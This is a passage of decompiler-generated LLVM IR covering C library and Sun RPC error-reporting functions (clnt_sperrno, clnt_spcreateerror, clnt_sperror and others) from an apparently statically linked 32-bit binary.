dec_label_pc_8059d6d:                             ; preds = %dec_label_pc_8059d63, %entry
  store i32 ptrtoint (i32* @global_var_805cd6e.353 to i32), i32* @edx, align 4
  br label %dec_label_pc_8059d74

dec_label_pc_8059d74:                             ; preds = %dec_label_pc_8059d63, %dec_label_pc_8059d6d
  %v0_8059d75 = phi i32 [ %v4_8059d5b, %dec_label_pc_8059d63 ], [ ptrtoint (i32* @global_var_805cd6e.353 to i32), %dec_label_pc_8059d6d ]
  %v0_8059d74 = phi i32 [ ptrtoint ([3 x i8]* @global_var_805cd6c.352 to i32), %dec_label_pc_8059d63 ], [ ptrtoint (i32* @global_var_805cd6e.353 to i32), %dec_label_pc_8059d6d ]
  %v0_8059d7b = load i32, i32* @global_var_80627d0, align 16
  %v6_8059d81 = call i32 @fprintf(i32 %v0_8059d7b, i32 ptrtoint ([8 x i8]* @global_var_805cd48.354 to i32), i32 %v0_8059d75, i32 %v0_8059d74)
  ret i32 %v6_8059d81

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_805cd6e.353 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_8059d74, { 1, 0 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_8059d8f = ptrtoint i32* %stack_var_12 to i32
  %v0_8059d97 = load i32, i32* @edx, align 4
  %v4_8059da1 = inttoptr i32 %arg1 to i16*
  %v5_8059da1 = call i32 @__GI_vfprintf(i16* %v4_8059da1, i32 %arg2, i32 %v2_8059d8f, i32 %v0_8059d97)
  ret i32 %v5_8059da1
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8059dad = ptrtoint i8* %arg1 to i32
  %v2_8059db5 = mul i32 %arg2, 256
  %v3_8059db5 = and i32 %v2_8059db5, 65280
  %v4_8059db5 = and i32 %arg2, -65281
  %v5_8059db5 = or i32 %v3_8059db5, %v4_8059db5
  %v8_8059db7.pre = load i1, i1* @df, align 1
  %v9_8059db7 = select i1 %v8_8059db7.pre, i32 -1, i32 1
  br label %dec_label_pc_8059db7

dec_label_pc_8059db7:                             ; preds = %dec_label_pc_8059dbc, %entry
  %v4_8059db7 = phi i32 [ %v6_8059db7, %dec_label_pc_8059dbc ], [ %v5_8059db5, %entry ]
  %v7_8059db7 = phi i32 [ %v10_8059db7, %dec_label_pc_8059dbc ], [ %v4_8059dad, %entry ]
  %v1_8059db7 = inttoptr i32 %v7_8059db7 to i8*
  %v2_8059db7 = load i8, i8* %v1_8059db7, align 1
  %v10_8059db7 = add i32 %v7_8059db7, %v9_8059db7
  %v3_8059db8 = udiv i32 %v4_8059db7, 256
  %v4_8059db8 = trunc i32 %v3_8059db8 to i8
  %v16_8059db8 = icmp eq i8 %v2_8059db7, %v4_8059db8
  br i1 %v16_8059db8, label %dec_label_pc_8059dc5, label %dec_label_pc_8059dbc

dec_label_pc_8059dbc:                             ; preds = %dec_label_pc_8059db7
  %v3_8059db7 = zext i8 %v2_8059db7 to i32
  %v5_8059db7 = and i32 %v4_8059db7, -256
  %v6_8059db7 = or i32 %v3_8059db7, %v5_8059db7
  %v4_8059dbc = icmp eq i8 %v2_8059db7, 0
  %v1_8059dbe = icmp eq i1 %v4_8059dbc, false
  br i1 %v1_8059dbe, label %dec_label_pc_8059db7, label %dec_label_pc_8059dc0

dec_label_pc_8059dc0:                             ; preds = %dec_label_pc_8059dbc
  br label %dec_label_pc_8059dc5

dec_label_pc_8059dc5:                             ; preds = %dec_label_pc_8059db7, %dec_label_pc_8059dc0
  %v0_8059dc5 = phi i32 [ 1, %dec_label_pc_8059dc0 ], [ %v10_8059db7, %dec_label_pc_8059db7 ]
  %v1_8059dc7 = add i32 %v0_8059dc5, -1
  ret i32 %v1_8059dc7

; uselistorder directives
  uselistorder i8 %v2_8059db7, { 1, 2, 0 }
  uselistorder i32 %v4_8059db7, { 1, 0 }
  uselistorder i32 -256, { 56, 2, 57, 1, 58, 15, 16, 59, 60, 23, 4, 31, 30, 3, 0, 17, 18, 61, 62, 7, 63, 5, 64, 6, 65, 66, 13, 19, 20, 21, 22, 9, 33, 32, 8, 93, 94, 72, 76, 77, 78, 79, 80, 81, 96, 82, 48, 49, 50, 47, 99, 100, 95, 51, 10, 52, 110, 67, 73, 83, 84, 85, 86, 87, 88, 89, 11, 90, 91, 92, 74, 41, 24, 97, 98, 14, 25, 101, 26, 27, 28, 104, 105, 106, 108, 109, 107, 103, 102, 12, 29, 38, 34, 35, 36, 37, 39, 40, 42, 43, 44, 45, 46, 53, 54, 55, 68, 69, 70, 71, 75 }
  uselistorder i1* @df, { 1, 4, 20, 21, 0, 2, 5, 22, 23, 24, 25, 3, 34, 35, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8059dc5, { 1, 0 }
}

define i32 @__GI_clnt_sperrno(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  br label %dec_label_pc_8059dd4

dec_label_pc_8059dd4:                             ; preds = %entry, %dec_label_pc_8059dea
  %v0_8059dea8 = phi i32 [ 0, %entry ], [ %v1_8059dea, %dec_label_pc_8059dea ]
  %v1_8059dd4 = mul nuw nsw i32 %v0_8059dea8, 8
  %v2_8059dd4 = add i32 %v1_8059dd4, ptrtoint (i32* @global_var_805cf60.355 to i32)
  %v3_8059dd4 = inttoptr i32 %v2_8059dd4 to i32*
  %v4_8059dd4 = load i32, i32* %v3_8059dd4, align 8
  %v16_8059dd4 = icmp eq i32 %v4_8059dd4, %arg1
  %v1_8059ddb = icmp eq i1 %v16_8059dd4, false
  br i1 %v1_8059ddb, label %dec_label_pc_8059dea, label %dec_label_pc_8059ddd

dec_label_pc_8059ddd:                             ; preds = %dec_label_pc_8059dd4
  %v2_8059ddd = add i32 %v1_8059dd4, ptrtoint (i32* @global_var_805cf64.356 to i32)
  %v3_8059ddd = inttoptr i32 %v2_8059ddd to i32*
  %v4_8059ddd = load i32, i32* %v3_8059ddd, align 4
  %v1_8059de4 = add i32 %v4_8059ddd, ptrtoint ([13 x i8]* @global_var_805d000.357 to i32)
  ret i32 %v1_8059de4

dec_label_pc_8059dea:                             ; preds = %dec_label_pc_8059dd4
  %v1_8059dea = add nuw nsw i32 %v0_8059dea8, 1
  %tmp11 = icmp ult i32 %v1_8059dea, 18
  br i1 %tmp11, label %dec_label_pc_8059dd4, label %dec_label_pc_8059df0

dec_label_pc_8059df0:                             ; preds = %dec_label_pc_8059dea
  ret i32 ptrtoint ([26 x i8]* @global_var_805cd50.358 to i32)

; uselistorder directives
  uselistorder i32 %v0_8059dea8, { 1, 0 }
  uselistorder label %dec_label_pc_8059dd4, { 1, 0 }
}

define i32 @free_mem() local_unnamed_addr {
entry:
  %v1_8059df9 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v1_8059e01 = add i32 %v1_8059df9, 156
  %v2_8059e01 = inttoptr i32 %v1_8059e01 to i32*
  %v3_8059e01 = load i32, i32* %v2_8059e01, align 4
  %v1_8059e07 = call i32 @free(i32 %v3_8059e01)
  ret i32 %v1_8059e07

; uselistorder directives
  uselistorder i32 (i32)* @free, { 49, 47, 50, 16, 15, 14, 13, 36, 35, 34, 33, 32, 31, 30, 29, 18, 46, 12, 51, 48, 1, 0, 11, 9, 8, 7, 6, 5, 4, 3, 10, 28, 27, 26, 25, 24, 23, 22, 39, 38, 21, 2, 45, 44, 20, 43, 42, 17, 41, 40, 37, 19 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 4, 5, 6, 1, 2, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 32, 33, 34, 35, 36, 37, 38, 39, 40, 30, 31, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102 }
}

define i32 @clnt_perrno(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8059e14 = load i32, i32* @global_var_80627d0, align 16
  store i32 %v0_8059e14, i32* @ebx, align 4
  %v1_8059e1e = call i32 @__GI_clnt_sperrno(i32 %arg1)
  %v0_8059e24 = load i32, i32* @ebx, align 4
  %v2_8059e26 = call i32 @__GI_fputs(i32 %v1_8059e1e, i32 %v0_8059e24)
  ret i32 %v2_8059e26
}

define i32 @_buf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059e30 = load i32, i32* @ebx, align 4
  store i32 %v0_8059e30, i32* %stack_var_-4, align 4
  %v1_8059e34 = call i32 @__rpc_thread_variables(i32 %v0_8059e30)
  store i32 %v1_8059e34, i32* @ebx, align 4
  %v1_8059e3b = add i32 %v1_8059e34, 156
  %v2_8059e3b = inttoptr i32 %v1_8059e3b to i32*
  %v3_8059e3b = load i32, i32* %v2_8059e3b, align 4
  %v4_8059e3b = icmp eq i32 %v3_8059e3b, 0
  %v1_8059e42 = icmp eq i1 %v4_8059e3b, false
  br i1 %v1_8059e42, label %dec_label_pc_8059e5a, label %dec_label_pc_8059e44

dec_label_pc_8059e44:                             ; preds = %entry
  %v1_8059e4c = call i32 @malloc(i32 256)
  %v1_8059e54 = load i32, i32* @ebx, align 4
  %v2_8059e54 = add i32 %v1_8059e54, 156
  %v3_8059e54 = inttoptr i32 %v2_8059e54 to i32*
  store i32 %v1_8059e4c, i32* %v3_8059e54, align 4
  %v0_8059e5a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8059e5a

dec_label_pc_8059e5a:                             ; preds = %entry, %dec_label_pc_8059e44
  %v0_8059e5a = phi i32 [ %v1_8059e34, %entry ], [ %v0_8059e5a.pre, %dec_label_pc_8059e44 ]
  %v1_8059e5a = add i32 %v0_8059e5a, 156
  %v2_8059e5a = inttoptr i32 %v1_8059e5a to i32*
  %v3_8059e5a = load i32, i32* %v2_8059e5a, align 4
  %v2_8059e60 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059e60, i32* @ecx, align 4
  %v2_8059e62 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059e62, i32* @ebx, align 4
  ret i32 %v3_8059e5a

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 24, 27, 6, 5, 4, 14, 13, 8, 26, 25, 23, 1, 0, 22, 2, 3, 15, 12, 11, 18, 20, 21, 19, 7, 17, 16, 10, 9 }
  uselistorder i32 156, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32 (i32)* @__rpc_thread_variables, { 12, 17, 5, 16, 15, 14, 13, 11, 2, 4, 10, 3, 9, 1, 8, 0, 7, 6 }
  uselistorder label %dec_label_pc_8059e5a, { 1, 0 }
}

define i32 @clnt_spcreateerror(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-1040 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8059e64 = load i32, i32* @ebp, align 4
  %v0_8059e65 = load i32, i32* @edi, align 4
  %v0_8059e66 = load i32, i32* @esi, align 4
  %v0_8059e67 = load i32, i32* @ebx, align 4
  store i32 %v0_8059e67, i32* %stack_var_-16, align 4
  %v3_8059e6e = call i32 @_buf(i32 %v0_8059e67, i32 %v0_8059e66, i32 %v0_8059e65)
  store i32 %v3_8059e6e, i32* @ebp, align 4
  %v1_8059e75 = icmp eq i32 %v3_8059e6e, 0
  br i1 %v1_8059e75, label %dec_label_pc_8059f49, label %dec_label_pc_8059e7d

dec_label_pc_8059e7d:                             ; preds = %entry
  %v0_8059e7d = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_8059e7d, i32* @edi, align 4
  %v3_8059e92 = call i32 @sprintf(i32 ptrtoint ([5 x i8]* @global_var_805cd6a.359 to i32), i32 %arg1)
  %v0_8059e97 = load i32, i32* @edi, align 4
  %v1_8059e97 = inttoptr i32 %v0_8059e97 to i32*
  %v2_8059e97 = load i32, i32* %v1_8059e97, align 4
  %v0_8059e99 = load i32, i32* @ebp, align 4
  %v2_8059e99 = add i32 %v0_8059e99, %v3_8059e92
  store i32 %v2_8059e99, i32* %ebx.global-to-local, align 4
  %v1_8059e9d = call i32 @__GI_clnt_sperrno(i32 %v2_8059e97)
  store i32 %v1_8059e9d, i32* @eax, align 4
  %v5_8059ea6 = inttoptr i32 %v2_8059e99 to i8*
  %v5_8059ea7 = call i32 @strcpy(i8* %v5_8059ea6, i32 %v1_8059e9d)
  %v4_8059eac = inttoptr i32 %v2_8059e99 to i8*
  %v3_8059eaf = call i32 @strlen(i8* %v4_8059eac)
  %v2_8059eb7 = add i32 %v2_8059e99, %v3_8059eaf
  store i32 %v2_8059eb7, i32* %ebx.global-to-local, align 4
  %v0_8059eb9 = load i32, i32* @edi, align 4
  %v1_8059eb9 = inttoptr i32 %v0_8059eb9 to i32*
  %v2_8059eb9 = load i32, i32* %v1_8059eb9, align 4
  store i32 %v2_8059eb9, i32* @eax, align 4
  %v9_8059ebb = icmp eq i32 %v2_8059eb9, 12
  br i1 %v9_8059ebb, label %dec_label_pc_8059efe, label %dec_label_pc_8059ec0

dec_label_pc_8059ec0:                             ; preds = %dec_label_pc_8059e7d
  %v9_8059ec0 = icmp eq i32 %v2_8059eb9, 14
  %v1_8059ec3 = icmp eq i1 %v9_8059ec0, false
  br i1 %v1_8059ec3, label %dec_label_pc_8059f42, label %dec_label_pc_8059ec5

dec_label_pc_8059ec5:                             ; preds = %dec_label_pc_8059ec0
  %v5_8059ecc = inttoptr i32 %v2_8059eb7 to i8*
  %v5_8059ecd = call i32 @strcpy(i8* %v5_8059ecc, i32 ptrtoint ([4 x i8]* @global_var_805cd6f.360 to i32))
  %v0_8059ed2 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8059ed2 = inttoptr i32 %v0_8059ed2 to i8*
  %v3_8059ed5 = call i32 @strlen(i8* %v4_8059ed2)
  %v0_8059edd = load i32, i32* @edi, align 4
  %v1_8059edd = add i32 %v0_8059edd, 4
  %v2_8059edd = inttoptr i32 %v1_8059edd to i32*
  %v3_8059edd = load i32, i32* %v2_8059edd, align 4
  %v0_8059ee0 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8059ee0 = add i32 %v0_8059ee0, %v3_8059ed5
  store i32 %v3_8059ee0, i32* %ebx.global-to-local, align 4
  %v1_8059ee2 = call i32 @__GI_clnt_sperrno(i32 %v3_8059edd)
  store i32 %v1_8059ee2, i32* @eax, align 4
  %v5_8059ee9 = inttoptr i32 %v3_8059ee0 to i8*
  %v5_8059eea = call i32 @strcpy(i8* %v5_8059ee9, i32 %v1_8059ee2)
  %v4_8059eef = inttoptr i32 %v3_8059ee0 to i8*
  %v3_8059ef2 = call i32 @strlen(i8* %v4_8059eef)
  %v3_8059efa = add i32 %v3_8059ee0, %v3_8059ef2
  store i32 %v3_8059efa, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059f42

dec_label_pc_8059efe:                             ; preds = %dec_label_pc_8059e7d
  %v5_8059f05 = inttoptr i32 %v2_8059eb7 to i8*
  %v5_8059f06 = call i32 @strcpy(i8* %v5_8059f05, i32 ptrtoint ([4 x i8]* @global_var_805cd6f.360 to i32))
  %v0_8059f0b = load i32, i32* %ebx.global-to-local, align 4
  %v4_8059f0b = inttoptr i32 %v0_8059f0b to i8*
  %v3_8059f0e = call i32 @strlen(i8* %v4_8059f0b)
  %v2_8059f1b = add i32 %v0_8059f0b, %v3_8059f0e
  store i32 %v2_8059f1b, i32* @esi, align 4
  %v2_8059f1e = ptrtoint i32* %stack_var_-1040 to i32
  store i32 %v2_8059f1e, i32* @ebx, align 4
  %v0_8059f23 = load i32, i32* @edi, align 4
  %v1_8059f23 = add i32 %v0_8059f23, 8
  %v2_8059f23 = inttoptr i32 %v1_8059f23 to i32*
  %v3_8059f23 = load i32, i32* %v2_8059f23, align 4
  %v5_8059f26 = call i32 @__GI___glibc_strerror_r(i32 %v3_8059f23, i32 %v2_8059f1e, i32 1024)
  %v3_8059f2c = ptrtoint i32* %stack_var_-1040 to i32
  store i32 %v3_8059f2c, i32* @eax, align 4
  %v0_8059f2e = load i32, i32* @esi, align 4
  %v5_8059f2e = inttoptr i32 %v0_8059f2e to i8*
  %v5_8059f2f = call i32 @strcpy(i8* %v5_8059f2e, i32 %v2_8059f1e)
  %v0_8059f34 = load i32, i32* @esi, align 4
  %v4_8059f34 = inttoptr i32 %v0_8059f34 to i8*
  %v3_8059f37 = call i32 @strlen(i8* %v4_8059f34)
  %v0_8059f3f = load i32, i32* @esi, align 4
  %v2_8059f3f = add i32 %v0_8059f3f, %v3_8059f37
  store i32 %v2_8059f3f, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059f42

dec_label_pc_8059f42:                             ; preds = %dec_label_pc_8059ec0, %dec_label_pc_8059ec5, %dec_label_pc_8059efe
  %v0_8059f42 = phi i32 [ %v2_8059eb7, %dec_label_pc_8059ec0 ], [ %v3_8059efa, %dec_label_pc_8059ec5 ], [ %v2_8059f3f, %dec_label_pc_8059efe ]
  %v1_8059f42 = inttoptr i32 %v0_8059f42 to i8*
  store i8 10, i8* %v1_8059f42, align 1
  %v0_8059f45 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059f45 = add i32 %v0_8059f45, 1
  %v2_8059f45 = inttoptr i32 %v1_8059f45 to i8*
  store i8 0, i8* %v2_8059f45, align 1
  %v0_8059f4f.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8059f49

dec_label_pc_8059f49:                             ; preds = %entry, %dec_label_pc_8059f42
  %v0_8059f4f = phi i32 [ 0, %entry ], [ %v0_8059f4f.pre, %dec_label_pc_8059f42 ]
  %v2_8059f51 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8059f51, i32* @ebx, align 4
  store i32 %v0_8059e66, i32* @esi, align 4
  store i32 %v0_8059e65, i32* @edi, align 4
  store i32 %v0_8059e64, i32* @ebp, align 4
  ret i32 %v0_8059f4f

; uselistorder directives
  uselistorder i32 %v2_8059f1e, { 1, 0, 2 }
  uselistorder i32 %v3_8059ee0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8059e99, { 1, 0, 2, 3 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 4, 1, 2, 5, 6, 7, 8 }
  uselistorder i32 ()* @__GI___rpc_thread_createerr, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8059f49, { 1, 0 }
  uselistorder label %dec_label_pc_8059f42, { 2, 1, 0 }
}

define i32 @clnt_pcreateerror(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8059f5a = load i32, i32* @global_var_80627d0, align 16
  store i32 %v0_8059f5a, i32* @ebx, align 4
  %v1_8059f64 = call i32 @clnt_spcreateerror(i32 %arg1)
  store i32 %arg1, i32* @edx, align 4
  %v0_8059f6b = load i32, i32* @ebx, align 4
  %v2_8059f6d = call i32 @__GI_fputs(i32 %v1_8059f64, i32 %v0_8059f6b)
  ret i32 %v2_8059f6d
}

define i32 @__GI_clnt_sperror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1056 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8059f77 = load i32, i32* @ebp, align 4
  %v0_8059f78 = load i32, i32* @edi, align 4
  %v0_8059f79 = load i32, i32* @esi, align 4
  %v0_8059f7a = load i32, i32* @ebx, align 4
  store i32 %v0_8059f7a, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8059f88 = call i32 @_buf(i32 %v0_8059f7a, i32 %v0_8059f79, i32 %v0_8059f78)
  store i32 %v3_8059f88, i32* @ebp, align 4
  %v2_8059f91 = icmp eq i32 %v3_8059f88, 0
  br i1 %v2_8059f91, label %dec_label_pc_805a0df, label %dec_label_pc_8059f99

dec_label_pc_8059f99:                             ; preds = %entry
  %v0_8059f9b = load i32, i32* @ebx, align 4
  %v1_8059f9b = add i32 %v0_8059f9b, 4
  %v2_8059f9b = inttoptr i32 %v1_8059f9b to i32*
  %v3_8059f9b = load i32, i32* %v2_8059f9b, align 4
  %v7_8059fa7 = add i32 %v3_8059f9b, 8
  %v8_8059fa7 = inttoptr i32 %v7_8059fa7 to i32*
  %v9_8059fa7 = load i32, i32* %v8_8059fa7, align 4
  call void @__pseudo_call(i32 %v9_8059fa7)
  %v3_8059fba = call i32 @sprintf(i32 ptrtoint ([5 x i8]* @global_var_805cd6a.359 to i32), i32 %arg1)
  %v3_8059fc6 = add i32 %v3_8059fba, %v3_8059f88
  store i32 %v3_8059fc6, i32* @ebx, align 4
  %v1_8059fca = call i32 @__GI_clnt_sperrno(i32 %tmp18)
  store i32 %v1_8059fca, i32* @eax, align 4
  %v0_8059fd3 = load i32, i32* @ebx, align 4
  %v5_8059fd3 = inttoptr i32 %v0_8059fd3 to i8*
  %v5_8059fd4 = call i32 @strcpy(i8* %v5_8059fd3, i32 %v1_8059fca)
  %v0_8059fd9 = load i32, i32* @ebx, align 4
  %v4_8059fd9 = inttoptr i32 %v0_8059fd9 to i8*
  %v3_8059fdc = call i32 @strlen(i8* %v4_8059fd9)
  %v0_8059fec = load i32, i32* @ebx, align 4
  %v2_8059fec = add i32 %v0_8059fec, %v3_8059fdc
  store i32 %v2_8059fec, i32* @esi, align 4
  switch i32 %tmp18, label %dec_label_pc_805a0b8 [
    i32 0, label %dec_label_pc_805a0d6
    i32 1, label %dec_label_pc_805a0d6
    i32 2, label %dec_label_pc_805a0d6
    i32 3, label %dec_label_pc_805a003
    i32 4, label %dec_label_pc_805a003
    i32 5, label %dec_label_pc_805a0d6
    i32 6, label %dec_label_pc_805a0a3
    i32 7, label %dec_label_pc_805a037
    i32 8, label %dec_label_pc_805a0d6
    i32 9, label %dec_label_pc_805a0a3
    i32 10, label %dec_label_pc_805a0d6
    i32 11, label %dec_label_pc_805a0d6
    i32 12, label %dec_label_pc_805a0d6
    i32 13, label %dec_label_pc_805a0d6
    i32 14, label %dec_label_pc_805a0d6
    i32 15, label %dec_label_pc_805a0d6
    i32 16, label %dec_label_pc_805a0d6
    i32 17, label %dec_label_pc_805a0d6
  ]

dec_label_pc_805a003:                             ; preds = %dec_label_pc_8059f99, %dec_label_pc_8059f99
  %v2_805a009 = ptrtoint i32* %stack_var_-1056 to i32
  store i32 %v2_805a009, i32* @ebx, align 4
  %v3_805a00e = load i32, i32* %stack_var_-28, align 4
  %v5_805a015 = call i32 @__GI___glibc_strerror_r(i32 %v3_805a00e, i32 %v2_805a009, i32 1024)
  %v0_805a0cb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805a0cb

dec_label_pc_805a028:                             ; preds = %dec_label_pc_805a042
  %v2_805a028 = add i32 %v1_805a042, ptrtoint (i32* @global_var_805ce44.363 to i32)
  %v3_805a028 = inttoptr i32 %v2_805a028 to i32*
  %v4_805a028 = load i32, i32* %v3_805a028, align 4
  %v1_805a02f = add i32 %v4_805a028, ptrtoint ([18 x i8]* @global_var_805ce80.364 to i32)
  br label %dec_label_pc_805a053

dec_label_pc_805a037:                             ; preds = %dec_label_pc_8059f99
  %v3_805a037 = load i32, i32* %stack_var_-28, align 4
  store i32 0, i32* @eax, align 4
  br label %dec_label_pc_805a042

dec_label_pc_805a042:                             ; preds = %dec_label_pc_805a037, %dec_label_pc_805a04b
  %v0_805a05339 = phi i32 [ 0, %dec_label_pc_805a037 ], [ %v1_805a04b, %dec_label_pc_805a04b ]
  %v1_805a042 = mul nuw nsw i32 %v0_805a05339, 8
  %v2_805a042 = add i32 %v1_805a042, ptrtoint (i32* @global_var_805ce40.365 to i32)
  %v3_805a042 = inttoptr i32 %v2_805a042 to i32*
  %v4_805a042 = load i32, i32* %v3_805a042, align 8
  %v16_805a042 = icmp eq i32 %v4_805a042, %v3_805a037
  br i1 %v16_805a042, label %dec_label_pc_805a028, label %dec_label_pc_805a04b

dec_label_pc_805a04b:                             ; preds = %dec_label_pc_805a042
  %v1_805a04b = add nuw nsw i32 %v0_805a05339, 1
  store i32 %v1_805a04b, i32* @eax, align 4
  %tmp = icmp ult i32 %v1_805a04b, 8
  br i1 %tmp, label %dec_label_pc_805a042, label %dec_label_pc_805a051

dec_label_pc_805a051:                             ; preds = %dec_label_pc_805a04b
  br label %dec_label_pc_805a053

dec_label_pc_805a053:                             ; preds = %dec_label_pc_805a028, %dec_label_pc_805a051
  %storemerge5 = phi i32 [ 0, %dec_label_pc_805a051 ], [ %v1_805a02f, %dec_label_pc_805a028 ]
  store i32 %storemerge5, i32* @edi, align 4
  %v5_805a05a = inttoptr i32 %v2_8059fec to i8*
  %v5_805a05b = call i32 @strcpy(i8* %v5_805a05a, i32 ptrtoint ([9 x i8]* @global_var_805cda8.366 to i32))
  %v0_805a060 = load i32, i32* @esi, align 4
  %v4_805a060 = inttoptr i32 %v0_805a060 to i8*
  %v3_805a063 = call i32 @strlen(i8* %v4_805a060)
  store i32 %v3_805a063, i32* @eax, align 4
  %v0_805a06b = load i32, i32* @edi, align 4
  %v1_805a06b = icmp eq i32 %v0_805a06b, 0
  %v0_805a06d = load i32, i32* @esi, align 4
  %v2_805a06d = add i32 %v0_805a06d, %v3_805a063
  store i32 %v2_805a06d, i32* @ebx, align 4
  br i1 %v1_805a06b, label %dec_label_pc_805a08b, label %dec_label_pc_805a072

dec_label_pc_805a072:                             ; preds = %dec_label_pc_805a053
  %v5_805a075 = inttoptr i32 %v2_805a06d to i8*
  %v5_805a076 = call i32 @strcpy(i8* %v5_805a075, i32 %v0_805a06b)
  %v0_805a07b = load i32, i32* @ebx, align 4
  %v4_805a07b = inttoptr i32 %v0_805a07b to i8*
  %v3_805a07e = call i32 @strlen(i8* %v4_805a07b)
  %v0_805a086 = load i32, i32* @ebx, align 4
  %v2_805a086 = add i32 %v0_805a086, %v3_805a07e
  store i32 %v2_805a086, i32* @esi, align 4
  br label %dec_label_pc_805a0d6

dec_label_pc_805a08b:                             ; preds = %dec_label_pc_805a053
  %v4_805a099 = call i32 @sprintf(i32 %v2_805a06d, i32 ptrtoint ([36 x i8]* @global_var_805cdb1.367 to i32))
  %v0_805a09e = load i32, i32* @ebx, align 4
  %v2_805a09e = add i32 %v0_805a09e, %v4_805a099
  br label %dec_label_pc_805a0d3

dec_label_pc_805a0a3:                             ; preds = %dec_label_pc_8059f99, %dec_label_pc_8059f99
  br label %dec_label_pc_805a0cb

dec_label_pc_805a0b8:                             ; preds = %dec_label_pc_8059f99
  br label %dec_label_pc_805a0cb

dec_label_pc_805a0cb:                             ; preds = %dec_label_pc_805a0a3, %dec_label_pc_805a003, %dec_label_pc_805a0b8
  %v0_805a0cb = phi i32 [ %v2_8059fec, %dec_label_pc_805a0a3 ], [ %v0_805a0cb.pre, %dec_label_pc_805a003 ], [ %v2_8059fec, %dec_label_pc_805a0b8 ]
  %v2_805a0cc = phi i8* [ getelementptr inbounds ([40 x i8], [40 x i8]* @global_var_805cd80.368, i32 0, i32 0), %dec_label_pc_805a0a3 ], [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805cd73.362, i32 0, i32 0), %dec_label_pc_805a003 ], [ getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_805cdd5.369, i32 0, i32 0), %dec_label_pc_805a0b8 ]
  %v3_805a0cc = ptrtoint i8* %v2_805a0cc to i32
  %v4_805a0cc = call i32 @sprintf(i32 %v0_805a0cb, i32 %v3_805a0cc)
  %v0_805a0d1 = load i32, i32* @esi, align 4
  %v3_805a0d1 = add i32 %v0_805a0d1, %v4_805a0cc
  br label %dec_label_pc_805a0d3

dec_label_pc_805a0d3:                             ; preds = %dec_label_pc_805a08b, %dec_label_pc_805a0cb
  %storemerge = phi i32 [ %v3_805a0d1, %dec_label_pc_805a0cb ], [ %v2_805a09e, %dec_label_pc_805a08b ]
  store i32 %storemerge, i32* @esi, align 4
  br label %dec_label_pc_805a0d6

dec_label_pc_805a0d6:                             ; preds = %dec_label_pc_8059f99, %dec_label_pc_8059f99, %dec_label_pc_8059f99, %dec_label_pc_8059f99, %dec_label_pc_8059f99, %dec_label_pc_8059f99, %dec_label_pc_8059f99, %dec_label_pc_8059f99, %dec_label_pc_8059f99, %dec_label_pc_8059f99, %dec_label_pc_8059f99, %dec_label_pc_8059f99, %dec_label_pc_8059f99, %dec_label_pc_805a072, %dec_label_pc_805a0d3
